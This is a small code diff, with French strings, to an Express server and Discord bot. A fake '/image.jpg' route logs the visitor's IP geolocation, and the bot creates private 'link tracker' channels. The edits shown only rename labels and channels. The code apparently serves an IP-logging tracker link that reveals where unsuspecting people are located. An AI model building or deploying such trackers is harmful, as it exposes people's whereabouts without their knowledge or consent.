@@ -54,7 +54,7 @@ app.get('/image.jpg', async (req, res) => {
     const geo = lookup.get(ip);
     const loc = geo?.location;
 
-    log += `🌍 Localisation MaxMind :\n`;
+    log += `🌍 Localisation :\n`;
     log += `• Pays : ${geo?.country?.names?.fr || '❌ Introuvable'}\n`;
     log += `• Région : ${geo?.subdivisions?.[0]?.names?.fr || '❌ Introuvable'}\n`;
     log += `• Ville : ${geo?.city?.names?.fr || '❌ Introuvable'}\n`;
@@ -99,7 +99,6 @@ app.get('/image.jpg', async (req, res) => {
 
   res.status(204).send();
 });
-
 app.listen(port, () => {
   console.log(`🛰️ Serveur Express actif sur le port ${port}`);
 });
@@ -162,7 +161,7 @@ client.on(Events.InteractionCreate, async interaction => {
     const user = interaction.user;
 
     const shortId = crypto.randomBytes(3).toString("hex");
-    const channelName = `🔍・suivi-${user.username.toLowerCase()}-${shortId}`;
+    const channelName = `🔗・mon-lien-tracker-${shortId}`;
 
     const privateChannel = await guild.channels.create({
       name: channelName,
